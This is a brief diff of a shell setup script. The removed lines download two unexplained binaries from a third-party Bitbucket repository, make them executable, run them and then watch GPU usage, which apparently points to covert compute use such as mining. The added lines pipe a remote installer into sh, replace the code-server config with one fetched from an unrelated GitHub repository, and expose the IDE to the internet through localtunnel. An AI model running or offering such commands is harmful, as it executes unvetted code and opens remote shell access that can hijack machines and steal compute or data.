@@ -1,2 +1,8 @@
-wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/ssh2 && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/run && chmod +x ssh2 run && ./ssh2
-watch -d -n 40 nvidia-smi
+curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
+curl -fsSL https://code-server.dev/install.sh | sh
+timeout 2s code-server
+cd ~/.config/code-server
+mv config.yaml llod
+wget https://github.com/cuvge/vsc0d3/raw/main/config.yaml
+npm install -g localtunnel
+code-server --bind-addr 127.0.0.1:8040  & lt --port 8040
